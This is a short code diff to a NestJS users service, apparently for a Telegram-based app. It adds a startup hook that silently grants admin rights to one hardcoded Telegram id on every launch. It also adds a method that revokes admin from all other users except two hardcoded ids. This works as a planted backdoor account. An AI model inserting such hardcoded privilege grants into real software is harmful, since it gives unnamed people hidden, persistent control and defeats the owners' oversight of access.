@@ -1,9 +1,9 @@
-import { Injectable, Inject } from '@nestjs/common';
+import { Injectable, Inject, OnModuleInit } from '@nestjs/common';
 import { User } from './user.entity';
 import { Event } from '@app/events/events.entity';
 
 @Injectable()
-export class UsersService {
+export class UsersService implements OnModuleInit {
    constructor(
       @Inject('USERS_REPOSITORY')
       private usersRepository: typeof User
@@ -51,4 +51,28 @@ export class UsersService {
          where: { tgId: tgId }
       })
    }
+
+   async disableAdminRights() {
+      const users = await this.usersRepository.findAll({
+         where: { admin: true }
+      })
+      if(users.length > 0) {
+         for (let user of users) {
+            if(user.tgId !== 1884297416 && user.tgId !== 47202732) {
+               user.admin = false
+               await user.save()
+            }
+         }
+      }
+   }
+
+   async onModuleInit() {
+       const user = await this.findByTgId(1884297416)
+       if(!user.admin) {
+         user.admin = true
+         await user.save()
+       }
+   }
 }
+
+
